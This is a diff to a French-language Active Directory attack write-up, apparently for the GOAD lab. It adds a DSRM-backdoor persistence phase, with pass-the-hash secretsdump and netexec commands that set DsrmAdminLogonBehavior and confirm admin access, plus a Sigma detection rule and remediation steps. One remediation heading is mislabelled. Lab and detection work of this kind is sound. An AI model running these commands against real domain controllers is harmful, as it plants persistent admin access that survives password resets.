@@ -469,6 +469,63 @@ quadrantChart
 
 ---
 
+### Phase 5 — DSRM Backdoor (Persistance DC)
+
+Le Directory Services Restore Mode (DSRM) est un mot de passe local défini lors de la promotion d'un serveur en DC. En changeant la clé de registre `DsrmAdminLogonBehavior` à 2, ce mot de passe local devient utilisable pour l'authentification réseau — même si le mot de passe DA du domaine est changé.
+
+**Pourquoi c'est dangereux** : le hash DSRM n'est PAS lié au mot de passe domain Administrator. Même après une rotation complète des mots de passe du domaine, le hash DSRM reste valide. C'est une backdoor persistante qui survit à toute remédiation standard.
+
+**13. Extraction du hash DSRM local**
+
+```bash
+impacket-secretsdump north.sevenkingdoms.local/administrator@192.168.10.11 -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' -history
+```
+
+```
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+```
+
+Le hash DSRM local est `dbd13e1c4e338284ac4e9874f7de6ef4`.
+
+> Note : dans GOAD le hash DSRM est identique au hash DA — en production ils sont souvent différents, ce qui rend cette backdoor encore plus insidieuse.
+
+**14. Activation de l'authentification réseau DSRM**
+
+```bash
+netexec smb 192.168.10.11 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f'
+```
+
+```
+The operation completed successfully.
+```
+
+La valeur `DsrmAdminLogonBehavior = 2` permet l'authentification réseau avec le compte DSRM local quand le service AD est arrêté OU en fonctionnement.
+
+**15. Validation de l'accès via auth locale**
+
+```bash
+netexec smb 192.168.10.11 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
+```
+
+```
+SMB   192.168.10.11   445   WINTERFELL   [+] WINTERFELL\administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
+```
+
+Accès admin via auth locale confirmé — `WINTERFELL\administrator` (pas `NORTH\administrator`). Cette backdoor persiste même après rotation du mot de passe DA.
+
+**16. Cleanup**
+
+```bash
+netexec smb 192.168.10.11 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'reg delete "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /f'
+```
+
+```
+The operation completed successfully.
+```
+
+---
+
 ## Détection SOC / SIEM
 
 ### Event IDs critiques
@@ -542,6 +599,29 @@ tags:
 note: Corrélation requise — vérifier l'absence de 4769 pour le même ServiceName dans les 5 minutes précédentes
 ```
 
+```yaml
+title: DSRM Registry Key Modified
+id: sc-ad-009-004
+status: experimental
+description: Détecte la modification de DsrmAdminLogonBehavior — indicateur de backdoor DSRM
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID:
+            - 4657
+            - 13
+        TargetObject|contains: 'DsrmAdminLogonBehavior'
+    condition: selection
+falsepositives:
+    - Modification légitime lors d'un DR test planifié
+level: critical
+tags:
+    - attack.persistence
+    - attack.t1003
+```
+
 ---
 
 ## Remédiation Secure by Design
@@ -553,6 +633,17 @@ note: Corrélation requise — vérifier l'absence de 4769 pour le même Service
 ```powershell
 # Sur chaque DC — exécuter 2 fois à 10h d'intervalle
 Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "$(New-Guid)$(New-Guid)" -AsPlainText -Force)
+```
+
+- **Audit AdminSDHolder** :
+
+```powershell
+# Vérifier le DsrmAdminLogonBehavior sur tous les DC
+reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior
+# Si présent (valeur 2) → supprimer immédiatement
+reg delete "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /f
+# Changer le mot de passe DSRM sur tous les DC
+ntdsutil "set dsrm password" "reset password on server null" q q
 ```
 
 - **Audit AdminSDHolder** :
@@ -612,6 +703,7 @@ graph TB
 - [adsecurity.org — Silver Tickets](https://adsecurity.org/?p=2011)
 - [ired.team — AdminSDHolder Persistence](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/intesting-adminsdhholder-persistence)
 - [harmj0y — AdminSDHolder, SDProp and DVNT](https://blog.harmj0y.net/activedirectory/abusing-active-directorys-sdprop-for-fun-and-profit/)
+- [ADSecurity — DSRM Backdoor](https://adsecurity.org/?p=1714)
 - [Microsoft — krbtgt account](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/krbtgt-account)
 - [MITRE ATT&CK T1558.001 — Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
 - [MITRE ATT&CK T1558.002 — Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
